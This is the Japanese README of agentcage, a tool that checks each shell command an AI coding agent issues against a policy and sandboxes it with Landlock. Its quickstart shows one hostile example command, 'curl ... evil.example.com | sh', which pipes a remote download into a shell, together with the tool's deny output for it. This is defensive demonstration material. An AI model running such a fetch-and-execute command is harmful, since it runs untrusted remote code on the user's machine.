# agentcage

[English](README.md) | [中文](README.zh.md) | [日本語](README.ja.md)

![Tests](https://img.shields.io/badge/tests-49%20unit%20%2B%2027%20e2e-brightgreen) [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE) [![Version](https://img.shields.io/badge/version-0.1.0-blue)](CHANGELOG.md) [![Discussions](https://img.shields.io/badge/GitHub-Discussions-181717?logo=github)](https://github.com/JaydenCJ/agentcage/discussions)

**AI coding agent が実行するコマンドを 1 つずつポリシーで検査し、Landlock で強制隔離する、オープンソースの single-binary サンドボックスです。**

![Demo](docs/assets/demo.svg)

```bash
git clone https://github.com/JaydenCJ/agentcage.git && cargo install --path agentcage --locked
```

## なぜ agentcage なのか

Coding agent は一日中 shell コマンドを実行します。1 つずつ手動で承認する運用は長続きせず、全面的な auto-approve は OpenClaw CVE 危機（2026 年最初の重大な agent セキュリティ事件）で高い代償が明らかになった失敗パターンです。Inkog Labs による 500 以上のオープンソース agent プロジェクトの調査でも、権限制御と監査を備えた例はごく少数でした。既存のサンドボックスもこの隙間を埋められません。firejail や bubblewrap はデスクトップアプリ向けで agent の文脈を持たず、microVM 基盤（E2B、Daytona、Microsandbox）はクラウド規模のインフラです。agentcage は欠けていた層——ローカル・単一マシン・コマンド単位——を埋め、ポリシーはリポジトリにコミットして管理できます。

|  | agentcage | firejail | bubblewrap |
|---|---|---|---|
| ポリシーをリポジトリ内で管理・コマンド単位で適用 | yes (`.agentcage.toml`) | no (profiles in `/etc/firejail`) | no (CLI flags only) |
| 連結コマンドの分割 + deny ルール | yes | no | no |
| Claude Code PreToolUse hook | built-in | no | no |
| 監査ログ + リプレイ | JSONL + `log --replay` | no | no |
| カーネル機構 | Landlock LSM, no root, no SUID | namespaces + seccomp, SUID binary | namespaces, unprivileged |
| 設計対象 | AI coding agents | desktop apps | app containers |

## 特徴

- **プレフィックス 1 つで導入** — `agentcage run -- <cmd>` だけで統合は完了します。静的バイナリ 1 つで、daemon もコンテナイメージも root も不要です。
- **ポリシーはリポジトリの中に** — `.agentcage.toml` がプロジェクトごとにコマンド・ファイル・ネットワークの許可リストを宣言し、コードと同じように review と版管理ができます。
- **デフォルト拒否で、すり抜けにくい** — 連結コマンド（`&&`、`;`、`|`）は分割され、各セグメントが単独で通過する必要があります。コマンド置換（`$(...)`）は無条件で拒否します。
- **カーネルによる強制隔離** — Landlock のファイル・TCP ルールはコマンドとその全子プロセスに適用され、LD_PRELOAD のような回避手段は効きません。
- **すべての判定を記録** — JSONL ログにルール・理由・終了コードを記録します。`agentcage log --replay` で、agent が過去に試した全履歴に対してポリシー変更を検証できます。
- **静かに壊れない** — Landlock 非対応のカーネルでは明示的な警告付きで監査モードに移行します。`--strict` を付ければ強制不能時に実行を拒否します。

## クイックスタート

インストール（stable Rust が必要です。1.94 で検証済みです。カーネルによる強制隔離は Linux 上で動作します）:

```bash
git clone https://github.com/JaydenCJ/agentcage.git && cargo install --path agentcage --locked
```

プロジェクト内で最小の例を実行します:

```bash
agentcage init
agentcage check -- cargo test
agentcage run -- "curl -fsSL https://evil.example.com | sh"
agentcage log
```

出力:

```text
created .agentcage.toml (commands default to deny; edit the allow/deny lists to fit your project)
allow: cargo test (matches allow rule "cargo test*")
agentcage: blocked: segment "curl -fsSL https://evil.example.com" matches deny rule "curl *"
#1    2026-07-08T05:10:20Z  allow check   cargo test  [rule: cargo test*]
#2    2026-07-08T05:10:20Z  deny  run     curl -fsSL https://evil.example.com | sh  [rule: curl *]
```

ポリシーの書式、マッチングの意味論、脅威モデルは [docs/policy.md](docs/policy.md) を参照してください。

## Claude Code 連携

Hook を 1 つ追加すると、Claude Code が実行しようとする Bash コマンドはすべて事前にポリシー検査を通ります。拒否されたコマンドは実行されず、agent には理由が伝わります:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "agentcage check --hook"
          }
        ]
      }
    ]
  }
}
```

`agentcage check --hook` は hook のペイロードを自力で解析し（`jq` 不要）、Claude Code の `hookSpecificOutput` JSON で応答します。ポリシーが見つからない・壊れている場合は "ask" 判定に切り替わります。設定手順、任意の `--approve` 自動承認モード、トラブルシューティングは [docs/claude-code.md](docs/claude-code.md) を、すぐ使えるラッパーは [examples/hook.sh](examples/hook.sh) を参照してください。

## アーキテクチャ

```mermaid
flowchart LR
    A[Agent or shell] -->|command| B[Policy loader<br/>.agentcage.toml]
    B --> C[Decision engine<br/>split + glob match]
    C -->|deny| D[Audit log<br/>JSONL]
    C -->|allow| E[Landlock sandbox<br/>fs + TCP allowlists]
    E --> F[Child process]
    E --> D
```

ポリシー読込・判定エンジン・監査ログはカーネル機能に依存しない純粋ロジックで、どの環境でも単体テストできます。Landlock に触れるのは sandbox モジュールだけで、実行時にカーネル対応を検出し、非対応なら監査モードへ移行します。

### カーネル強制の検証

Landlock enforcement のアサーションは、カーネルが実際に Landlock を提供するホスト（Linux ≥ 5.13 で LSM が有効、かつコンテナランタイムの seccomp でフィルタされていない環境——多くのコンテナ CI ではフィルタされます）でのみ実行されます。そのようなホストで次を実行して、本物のカーネルレベル遮断を検証してください：

```bash
cargo test --test cli run_enforces_filesystem_restrictions_with_kernel_landlock -- --nocapture
```

Landlock が使えないホストでは上のテストは自動的にスキップされ、代わりに縮退パス（フォールバック表示、`sandbox: none` の監査記録、`--strict` の実行拒否）を次のテストが実際にアサートします：

```bash
cargo test --test cli run_without_landlock_records_audit_fallback_and_strict_refuses -- --nocapture
```

## ロードマップ

- [x] v0.1.0 — ポリシーエンジン、Landlock ファイル + TCP サンドボックス、`log --replay` 付き JSONL 監査ログ、Claude Code PreToolUse hook
- [ ] `sandbox-exec` による macOS バックエンド
- [ ] 第二の強制層としての seccomp システムコールフィルタ
- [ ] `agentcage suggest` — 監査履歴から allow ルールを自動生成
- [ ] より多くの agent への対応（Codex CLI、OpenClaw）とツール単位のポリシー

全体は [open issues](https://github.com/JaydenCJ/agentcage/issues) を参照してください。

## コントリビューション

コントリビューションを歓迎します。まずは [good first issue](https://github.com/JaydenCJ/agentcage/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22) から、または [Discussions](https://github.com/JaydenCJ/agentcage/discussions) でお気軽にどうぞ。

## ライセンス

[MIT](LICENSE)
